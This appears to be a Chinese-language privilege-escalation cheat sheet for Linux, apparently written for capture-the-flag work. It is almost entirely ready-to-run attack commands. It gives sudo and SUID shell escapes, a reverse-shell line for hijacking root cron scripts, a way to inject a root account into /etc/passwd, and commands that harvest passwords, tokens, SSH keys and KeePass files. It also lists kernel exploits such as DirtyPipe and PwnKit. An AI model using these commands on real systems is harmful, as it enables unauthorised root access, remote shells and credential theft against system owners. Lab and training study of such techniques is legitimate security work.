# Linux 提权速查（拿到 shell 后按序过，每步产出记 RELAY.md）

## 0. 先看清自己是谁
```bash
id; sudo -n -l 2>/dev/null; cat /etc/passwd | grep -v nologin; uname -a
find / -perm -4000 -type f 2>/dev/null        # SUID
getcap -r / 2>/dev/null                        # capabilities
ls -la /etc/cron* ; cat /etc/crontab           # 计划任务
```

## 1. sudo -l 有输出（最常见得分点）
- `sudo -l` 列出的每个二进制都查 GTFOBins 思路：
  - `(ALL) NOPASSWD: env` → `sudo env /bin/sh`
  - `find` → `sudo find / -exec /bin/sh \;`
  - `vim/less/man` → `sudo vim -c '!sh'` / `sudo less` 然后 `!sh`
  - `awk` → `sudo awk 'BEGIN{system("/bin/sh")}'`
  - `python/perl/ruby/node` → `sudo python3 -c 'import pty;pty.spawn("/bin/sh")'`
  - `cp/tar/zip` → 覆盖 /etc/passwd 或带 shell 的 SUID 文件
  - `docker` → `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- `sudo -l` 报 LD_PRELOAD 可用 → 编译 .so 劫持（gcc 在就 30 秒搞定）

## 2. SUID/CAP 提权
- SUID 的 `find/env/vim/less/bash/base64/cp/mv/nmap(old)` 同上 GTFOBins
- cap_setuid+ep 的 python/perl 直接改 uid 脚本提权
- `getcap` 见 cap_dac_read_override（读任意文件=直读 flag）/
  cap_setuid（提权）/cap_net_raw（嗅探凭据）

## 3. 计划任务/路径劫持
- cron 里以 root 跑的可写脚本 → 直接改内容加 `bash -i >& /dev/tcp/IP/PORT 0>&1`
- cron 调用裸命令名（无绝对路径）且 PATH 含可写目录 → 放同名恶意文件
- `/etc/ld.so.preload`、可写的 /etc/passwd（生成 hash: `openssl passwd -1 x`）直接加 root 行

## 4. 凭据二次收集（提权前置）
```bash
grep -rE 'password|passwd|secret|token' /home /opt /var/www 2>/dev/null | head -50
cat ~/.bash_history ~/.mysql_history 2>/dev/null
grep -E 'PWD|PASS' /proc/*/environ 2>/dev/null | sort -u
find / -name '*.pem' -o -name 'id_rsa*' -o -name '*.kdbx' 2>/dev/null
config.php/wp-config.py/settings.py/application.yml 数据库配置
```
拿到 root 后立即：`bash /opt/tools/flag_sweep.sh`（flag 常只在 root 可读文件里）。

## 5. 内核漏洞（最后手段，先确认版本对应）
-脏牛(CVE-2016-5195, <4.8.3)/DirtyPipe(CVE-2022-0847, 5.8-5.16.11)
-PwnKit(CVE-2021-4034, polkit<0.120 有 pkexec 就试，成功率最高)
- 本地无公网：PoC 源码现场写（github 搜得到的 exp 大多单文件 C，gcc 现编译）
